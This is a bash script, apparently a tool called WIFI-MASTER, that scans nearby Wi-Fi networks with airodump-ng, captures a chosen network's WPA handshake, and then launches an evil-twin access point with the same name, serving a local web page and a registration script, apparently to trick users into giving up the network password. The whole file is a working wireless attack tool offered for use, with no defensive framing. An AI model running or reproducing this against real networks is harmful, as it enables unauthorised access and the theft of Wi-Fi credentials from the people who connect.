#!/bin/bash

clear

echo   " _________ _______ _________     _______  _______  _______ _________ _______  _______ "
echo "|\     /|\__   __/(  ____ \\__   __/    (       )(  ___  )(  ____ \\__   __/(  ____ \(  ____ )"
echo "| )   ( |   ) (   | (    \/   ) (       | () () || (   ) || (    \/   ) (   | (    \/| (    )|"
echo "| | _ | |   | |   | (__       | | _____ | || || || (___) || (_____    | |   | (__    | (____)|"
echo "| |( )| |   | |   |  __)      | |(_____)| |(_)| ||  ___  |(_____  )   | |   |  __)   |     __)"
echo "| || || |   | |   | (         | |       | |   | || (   ) |      ) |   | |   | (      | (\ ( "   
echo "| () () |___) (___| )      ___) (___    | )   ( || )   ( |/\____) |   | |   | (____/\| ) \ \__"
echo "(_______)\_______/|/       \_______/    |/     \||/     \|\_______)   )_(   (_______/|/   \__/"

get_start()
{
rm -r /opt/WifiMaster/Password_Hash/
mkdir /opt/WifiMaster/Password_Hash/
echo -e "\n\n\e[31mWlan Card:\e[0m"
read wlan
clear
}

first_scan()
{
ifconfig $wlan down
iwconfig $wlan mode monitor
ifconfig $wlan up
echo -e "\tPress ctl + c to stop the scan"
sleep 3
airodump-ng $wlan   -w /opt/WifiMaster/Password_Hash/Whandshake_wpa
clear
}


filter_output()
{
count=1
echo "NetWorks List:"
cat  /opt/WifiMaster/Password_Hash/Whandshake_wpa-01.kismet.netxml  | grep -o -P 'SSID>'.*'<'  | cut -c6-22  > BSSID.txt
cat  /opt/WifiMaster/Password_Hash/Whandshake_wpa-01.kismet.netxml  | grep -o -P '<essid cloaked="false">'.*''  | cut -c24-100 | awk -F\< '{print $1}' > ESSID.txt
paste ESSID.txt BSSID.txt | while IFS="$(printf '\t')" read -r essid bssid

do
  bssid[$count]=$bssid
  essid[$count]=${essid// /_}

  printf '_________________'
  printf '\t\nwifi group: %i\n' "$count"
  printf '\tESSID: %s\n' "$essid"
  printf '\tBSSID: %s\n' "$bssid"
  printf '________________\n'
  echo "${bssid[@]}" > /tmp/tempout
  echo "${essid[@]}" > /tmp/tempout2
  count=$((count+1))
done

echo -e "\nselect wifi group:\n"
read input
input1=$((input-1))

read -r -a bssid < /tmp/tempout
echo -e "${bssid[$input1]}\n"
c_bssid=${bssid[$input1]}

read -r -a essid < /tmp/tempout2
echo -e "${essid[$input]}\n"

c_essid=${essid[$input]}
}

deep_scan()
{
rm -r /opt/WifiMaster/Password_Hash
mkdir /opt/WifiMaster/Password_Hash
airodump-ng $wlan --bssid $c_bssid  --write /opt/WifiMaster/Password_Hash/wpa_HandShake
}


first_step_AP()
{
service network-manager stop
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables -P FORWARD ACCEPT
pkill hostapd
pkill dnsmasq
}

create_AP()
{
echo '' > /opt/WifiMaster/program_files/hostapd.conf
echo -e "interface=$wlan" >> /opt/WifiMaster/program_files/hostapd.conf
echo -e "ssid=$c_essid" >> /opt/WifiMaster/program_files/hostapd.conf
echo 'channel=1' >> /opt/WifiMaster/program_files/hostapd.conf
echo 'driver=nl80211' >> /opt/WifiMaster/program_files/hostapd.conf
}

fake_AP()
{
echo "creating access point"
sleep 3
clear
hostapd /opt/WifiMaster/program_files/hostapd.conf -B
dnsmasq -C /opt/WifiMaster/program_files/dnsmasq.conf
ifconfig $wlan 10.0.0.1 netmask 255.255.255.0
a2enmod rewrite
xterm -e 'cd /opt/WifiMaster/program_files/server/ && pwd && python -m SimpleHTTPServer 80 &> /opt/WifiMaster/program_files/log.txt ; exit'&
xterm -e 'python3 /opt/WifiMaster/program_files/reg.py ; exit'&
}

kill_AP()
{
service network-manager start
echo 0 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables -P FORWARD ACCEPT
pkill hostapd
pkill dnsmasq

}


main()
{
get_start
first_scan
filter_output
deep_scan
first_step_AP
create_AP
fake_AP
sleep 1000
kill_AP
}

main
